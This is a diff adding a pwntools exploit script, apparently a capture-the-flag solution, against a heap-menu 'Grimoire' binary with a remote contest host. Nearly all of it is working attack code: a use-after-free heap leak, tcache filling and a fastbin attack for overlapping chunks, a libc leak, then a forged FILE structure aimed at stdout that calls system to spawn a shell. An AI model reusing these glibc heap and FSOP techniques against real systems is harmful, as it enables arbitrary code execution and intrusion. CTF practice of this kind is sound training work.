@@ -1,0 +1,127 @@
+from time import pthread_getcpuclockid
+from pwn import *
+
+context.log_level = "debug"
+context.arch = "amd64"
+context.os = "linux"
+context.terminal = ["/usr/bin/tmux", "sp", "-h"]
+
+f_remote = True if "remote" in sys.argv else False
+f_gdb = True if "gdb" in sys.argv else False
+
+vuln_path = "./main"
+elf = ELF(vuln_path)
+libc = elf.libc
+
+io = process([vuln_path]) if not f_remote else remote("pwn-14caf623.p1.securinets.tn", 9091)
+
+
+def ddebug(b=""):
+    if not f_gdb: return
+    gdb.attach(io, gdbscript=b)
+    pause()
+
+
+grimoire = 0x4060
+
+
+def add(idx, name, effect="tinyfat", cost=b"11", cooldown=2, element=3):
+    io.sendlineafter("Choice: ", "1")
+    io.sendlineafter("0-31): ", str(idx))
+    io.sendlineafter("name: ", name)
+    io.sendlineafter("effect: ", effect)
+    io.sendlineafter("cost: ", cost)
+    io.sendlineafter("ds): ", str(cooldown))
+    io.sendlineafter("ice: ", str(element))
+
+
+def delete(idx):
+    io.sendlineafter(": ", "4")
+    io.sendlineafter(": ", str(idx))
+
+
+def show():
+    io.sendlineafter(": ", "3")
+
+
+def edit(idx, name, effect="tinyfat", cost=b"11", cooldown=2, element=3):
+    io.recvuntil("=== Grimoire Menu ===")
+    io.sendlineafter("Choice: ", "2")
+    io.sendlineafter("0-31): ", str(idx))
+    io.sendlineafter("name: ", name)
+    io.sendlineafter("effect: ", effect)
+    io.sendlineafter("cost: ", cost)
+    io.sendlineafter("ds): ", str(cooldown))
+    io.sendlineafter("ice: ", str(element))
+
+
+def feedback(size, data):
+    io.recvuntil("=== Grimoire Menu ===")
+    io.sendlineafter("Choice: ", "5")
+    io.sendlineafter("size of feedback: ", str(size))
+    io.sendlineafter("Enter feedback: ", data)
+
+
+def exit():
+    io.recvuntil("=== Grimoire Menu ===")
+    io.sendlineafter("Choice: ", "6")
+
+
+add(0, "tinyfat0")
+delete(0)
+show()
+leak = u64(io.recvuntil("\x05")[-5:].ljust(8, b"\x00"))
+heap = leak << 12
+log.success("heap :-----> " + hex(heap))
+for i in range(18):
+    if i + 1 == 8:
+        add(i + 1, f"tinyfat{i+1}", p64(0) * 3 + p64(0x81) + p64(heap >> 12))
+    else:
+        add(i + 1, f"tinyfat{i+1}")
+
+# 填满tcache
+for i in range(7):
+    delete(i + 1)
+
+# fastbin attack, 制造叠堆
+edit(7, p64((heap + 0x6d0) ^ (heap >> 12)))
+add(1, "tinyfat1")
+add(1, "tinyfat1", p64(0) * 3 + p64(0x481))
+delete(9)
+
+# leak libc
+show()
+io.recvuntil("tinyfat8")
+io.recvuntil("Name: ")
+leak = u64(io.recv(6).ljust(8, b"\x00"))
+log.success(hex(leak))
+libc.address = leak - (0x7faaaecf6b20 - 0x7faaaeaf3000)
+log.success("libc.address :-----> " + hex(libc.address))
+
+stdout_adr = libc.symbols["_IO_2_1_stdout_"]
+log.success("stdeout :-----> " + hex(stdout_adr))
+environ = libc.symbols["__environ"]
+# get a point t0 stderr
+edit(1, "a", p64(0) * 3 + p64(0x100) + p64(0x123456) * 2)
+delete(9)
+edit(1, "a", p64(0) * 3 + p64(0x100) + p64(0x123456) * 2)
+delete(9)
+edit(9, p64((heap >> 12) ^ (stdout_adr - 0x10)))
+
+ddebug("breakrva 0x01376\n breakrva 0x000015B0\n breakrva 0x1988\n breakrva 0x1A41\n continue")
+feedback(0xf8, "f")
+
+# fsop
+_IO_2_1_stdout_ = libc.symbols['_IO_2_1_stdout_']
+system = libc.symbols['system']
+fp = FileStructure(0)
+fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
+fp._IO_read_end = system
+fp._lock = _IO_2_1_stdout_ + 0x50
+fp._wide_data = _IO_2_1_stdout_ - 0x10
+fp.unknown2 = p64(0) * 3 + p64(0xffffffff) + p64(0) + p64(_IO_2_1_stdout_ + 0x10 - 0x68)
+fp.vtable = libc.symbols['_IO_wfile_jumps'] - 0x20
+payload = bytes(fp)
+feedback(0xf8, b"A" * 0x10 + payload)
+
+io.interactive()
